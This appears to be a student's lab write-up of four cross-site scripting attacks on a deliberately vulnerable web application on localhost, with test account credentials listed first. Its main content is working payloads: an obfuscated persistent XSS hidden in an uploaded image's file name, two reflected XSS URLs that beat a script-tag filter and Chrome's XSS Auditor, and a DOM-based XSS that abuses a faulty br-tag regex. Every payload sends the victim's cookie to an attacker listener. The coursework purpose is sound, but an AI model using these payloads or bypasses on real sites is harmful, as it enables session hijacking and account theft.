=========== LIST OF SECRET INFORMATION ============

1) Database 
ID: student
Password: student

2) User accounts => password:
user0@email.com => passw0rd (admin)
user1@email.com => passw0rd (admin)
user2@email.com => passw0rd
user3@email.com => passw0rd
user4@email.com => passw0rd
user5@email.com => passw0rd (attacker)
user6@email.com => passw0rd
user7@email.com => passw0rd
user8@email.com => passw0rd
student@student.com => student (admin)




=========== Class of Vulnerability: Persitent XSS (1)  =============

-What the attacker do to plant the bug:
	(i) Create an image file with name(cannot be done in windows due to filename restriction, but can be done on unix system): 

a." onerror=if(!$[0]){a=function(){sbrgURLimgsrcookieattr=1?8:8}+[],s=a[12]+a[1]+a[13]+a[12]+a[4]+a[14],d=document,u=d[a[s](16,3)],t=u[s](0,4)+u[s](5,12)+u[5]+8888+u[6]+a[36]+d[a[s](24,6)],$(a[s](19,3))[a[s](30,4)](a[s](22,3),t),$[0]=1;}"

	(ii) Login to the web application (user5@email.com/passw0rd) -> Home -> Profile -> Edit my profile
	(iii) Upload the image file on step (i) as profile photo

-Attacker's goal: Steal the cookie of the user that see the profile photo.

-What the victim do to get attacked:
	(i) Victim login to his/her account (student@student.com/student)
	(ii) Go to memberlist -> click the attacker name (user5)

-What the attacker do to see the victim's cookie:
	(i) Go to the attacker server (On the vm with path: /home/student/repo/node_listen )
	(ii) See the file temp. The newest cookie will be shown on the last line.

-The image file is provided on the folder ATTACK_A0096028B

-Vulnerability explanation:
 Currently, everytime the user upload the profile's photo, it will be stored in the server with the following format:
 '[user_id].[photo's extension]'. The photo's extension can be controlled by the user and have no restriction on the server.
 Moreover, we don't sanitize the profile's photo url. This vulnerability is rather restrictive. The exploit must not contain 
 slash ('/') since a file name must not contain this symbol. It also must not contain dot ('.') since the definition
 of extension is the portion after the last dot. Quotes and double quotes also prohibited since it will somehow make the 
 exploit to go outside the onerror attribute. Lastly, the length of the exploit must not exceed 255 since it is the maximum
 length of unix file name. Because of these restrictive nature, the exploit to send cookie to server would become much harder
 than just doing alert(1) (since we need either dot or quotes to access the cookie usually: document.cookie or document['cookie']).
 However it still can be done (with a lot of effort!!).

-This exploit works in Chrome, Firefox, and IE.


========= Class of Vulnerability: Reflected XSS Works in google chrome with XSS Auditor (2) =============

-What the attacker do to attack the admin:
	(i) Trick the admin (student@student.com/student) to go to the following link:

	https://localhost/admin/edit-info?user_id=%22%3C/script%3E%3Cscr%3Cscript%3Eipt%3Evar%20i=document.createElement(%27img%27);var%20c=%27/%27;i.src=%27http:%27%2Bc%2Bc%2B%27localhost%3A8888%2F%3Ftext%3D%27%2Bdocument.cookie;%22

-What an admin do to get attacked:
	(i)The admin login (student@student.com/student) and then go to the above link.

-Attacker's goal: Steal the cookie of the admin.

-Steps to see whether the attack was successful (same as (1)):
	(i) Go to the attacker server (On the vm with path: /home/student/repo/node_listen )
	(ii) See the file temp. The newest cookie will be shown on the last line.

-Vulnerability explanation:
 On client side:
 The application will give warning and reflect the user_id input in case the user_id is not exist.
 This warning is not properly sanitized.
 Moreover, the reflection will occur twice (one is shown and one is in HTML comment).
 Since it appear twice, we can trick XSS Auditor by treating the HTML code in between as string (put double quotes).
 And then we need to put the closing tags first before the opening tags.
 On server side:
 The web application server will replace all occurance of <script> to empty string.
 And then it would strip all other tags other than script (using php strip_tag).
 In this case, we can still put script tags by use: <scr<script>ipt>.

-This exploit works in Chrome(with XSSAuditor), Firefox, and IE(without XSS filter)

========= Class of Vulnerability:  Reflected XSS Works in google chrome without XSS Auditor (3) ==============

-What the attacker do to attack the admin:
	(i) Trick the admin (student@student.com/student) to go to the following link:

	https://localhost/admin/edit-info?user_id="<scr<script>ipt>var%20i=document.createElement(%27img%27);var%20c=%27/%27;i.src=%27http:%27%2Bc%2Bc%2B%27localhost%3A8888%2F%3Ftext%3D%27%2Bdocument.cookie;</script>

-What an admin do to get attacked:
	(i)The admin login (student@student.com/student) and then go to the above link.

-Attacker's goal: Steal the cookie of the admin.

-Steps to see whether the attack was successful (same as (1)):
	(i) Go to the attacker server (On the vm with path: /home/student/repo/node_listen )
	(ii) See the file temp. The newest cookie will be shown on the last line.

-Vulnerability explanation: Similar to previous reflected XSS (2).

-This exploit works in Chrome(without XSSAuditor), Firefox, and IE(without XSS filter)


========== Class of Vulnerability: DOM-based XSS (4) =============

-What the attacker do to attack a user:
	(i) Trick a user to go to the following link:

	https://localhost/users/search?search=%3Cbr%3Cb%20onmouseover=%22var%20i=document.createElement%28%27img%27%29;i.src=%27http://localhost%3A8888%2F%3Ftext%3D%27%2Bdocument.cookie%22%20style=%22display:%20inline-block;width:15000px;%20height:15000px;position:absolute;%20top:0;left:0%22%3E
	
-What a user do to get attacked:
	(i) The user login (user2@email.com/passw0rd) and click the above link.
	(ii) The user move the mouse pointer to the web-application body (below the header, i.e. near the text User Search).

-Attacker's goal: Steal the user's cookie.

-Steps to see whether the attack was successful (same as (1)):
	(i) Go to the attacker server (On the vm with path: /home/student/repo/node_listen )
	(ii) See the file temp. The newest cookie will be shown on the last line.


-Vulnerability explanation:
 In the user search page, in case we search [username] that does not exist, it will trigger the javascript to prompt:
 "Cannot find [username]!"
 What the javascript actually does is to take the [username] from the url query parameter with key: search.
 After that, it will try to use regex to strip all tags other than <br>.
 However, there is some bugs with the regex. If there is a not properly closed br open tags ( "<br" ),
 it will other tags inside it. Moreover, the browser will try to parse this other tag inside.
 And it turns out that the other tags we put inside will still allow some event such as 
 onmouseover or onclick (I tested that some event such as onload and onerror didn't work, also other attribute
 such as href or src also didn't work). Hence, we may still exploit this with the above exploit.

-This exploit works on Chrome, Firefox, and IE


 
